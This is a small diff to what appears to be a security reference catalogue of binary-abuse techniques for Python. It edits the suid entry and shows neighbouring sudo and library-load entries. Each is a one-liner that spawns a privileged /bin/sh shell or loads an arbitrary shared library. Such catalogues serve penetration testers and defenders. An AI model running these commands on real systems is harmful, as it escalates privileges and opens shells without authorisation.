@@ -44,7 +44,7 @@ functions:
   library-load:
     - code: python -c 'from ctypes import cdll; cdll.LoadLibrary("lib.so")'
   suid:
-    - code: ./python -c 'import os; os.system("/bin/sh -p")'
+    - code: ./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
   sudo:
     - code: sudo python -c 'import os; os.system("/bin/sh")'
   capabilities:
